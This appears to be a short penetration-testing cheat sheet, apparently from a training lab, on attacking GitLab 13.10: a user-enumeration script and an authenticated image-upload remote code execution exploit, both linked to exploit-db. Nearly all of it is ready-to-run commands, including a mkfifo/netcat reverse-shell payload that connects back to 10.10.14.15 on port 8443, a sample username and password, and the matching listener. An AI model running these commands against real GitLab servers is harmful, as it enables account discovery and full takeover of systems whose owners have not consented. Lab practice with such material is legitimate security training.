
### User Enuemration

[GitLab User Enum 13.10.3](https://www.exploit-db.com/exploits/49821)

default usage
```shell-session
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

### Authenticated RCE

[Image upload RCE](https://www.exploit-db.com/exploits/49951)

default usage
```shell-session
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

listener
```shell-session
nc -lnvp 8443
```




